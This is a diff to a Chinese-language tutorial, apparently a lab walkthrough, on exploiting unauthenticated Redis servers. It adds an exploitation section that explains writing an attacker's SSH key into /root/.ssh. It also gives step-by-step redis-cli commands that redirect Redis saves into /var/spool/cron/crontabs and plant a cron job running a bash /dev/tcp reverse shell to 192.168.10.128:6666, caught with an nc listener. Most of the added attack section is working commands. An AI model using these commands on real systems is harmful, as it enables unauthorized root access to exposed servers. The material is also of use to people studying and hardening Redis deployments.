@@ -18,7 +18,6 @@ Redis默认情况下，会绑定在0.0.0.0:6379(在redis3.2之后，redis增加�
 漏洞的产生条件有以下两点:
 
 (1)    Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网
-
 (2)    没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务
 
 二、漏洞影响版本
@@ -75,7 +74,54 @@ kali安装Redis客户端。
 修改Redis服务端redis.conf配置文件:<br>
 1、关闭`protected-mode`
 ![关闭protected](/assets/Redis未授权/关闭protected.png)
-2、绑定本机可以接受访问的IP
+2、绑定本机可以接受访问的IP（图中两种方式都可以）
 ![bindip](/assets/Redis未授权/bindip.png)
 
-###  Redis未授权漏洞利用
+##  Redis未授权漏洞利用
+### 1、写入ssh公钥实现ssh远程登录
+>其原理是在redis数据库中插入一条数据，将攻击机的公钥作为value,key值随意，然后通过修改redis数据库的默认路径为/root/.ssh（该路径当服务端redis服务为root权限运行时才可用，若为其他用户运行时，则需要更改为对应的路径；且该路径只有在服务端启用了ssh,并使用密钥ssh远程登录过后才会生成）和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key。关于ssh密钥远程登录的细节后续再另外说明。
+
+### 2、在crontab里写入反弹shell的计划任务（在足够的权限下）
+
+> 在利用redis在ubuntu下通过cron反弹shell时一直不成功,3点原因如下：
+>1. ubuntu的cron的shell环境和centos不一样，
+>2. 还有就是文件权限问题
+>3. 就是通过redis写的任务计划里的乱码也会导致cron文件不能执行<br>
+>参考：`http://zone.secevery.com/article/972`<br>
+
+#### step 1. 通过redis-cli进入交互式shell
+```redis-cli -h 192.168.10.132```
+![redis-cli](/assets/Redis未授权/redis-cli.png)
+#### step 2. 查看`dir`和`dbfilename`参数信息，用于还原原有配置
+```
+config get dir
+config get dbfilename
+```
+![原配置](/assets/Redis未授权/原配置.png)
+#### step 3. 设置redis保存数据的文件夹路径
+```
+config set dir /var/spool/cron/crontabs
+```
+![set_dir](/assets/Redis未授权/set_dir.png)
+![set_dir2](/assets/Redis未授权/set_dir2.png)
+#### step 4. 设置redis保存数据的文件名
+```
+config set dbfilename root
+```
+
+#### step 5. 设置写入计划任务的内容（key值随意）,并保存
+```
+set xxx  "\n\n\n* * * * * bash -i>& /dev/tcp/192.168.10.128/6666 0>&1\n\n\n"
+save
+```
+![set_cron](/assets/Redis未授权/set_cron.png)
+#### step 6. 在攻击机上nc监听端口，接收反弹shell
+```
+nc -lvvp 6666
+```
+![反弹shell](/assets/Redis未授权/反弹shell.png)
+
+tail -f /var/log/syslog
+
+(root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+(CRON) info (No MTA installed, discarding output)
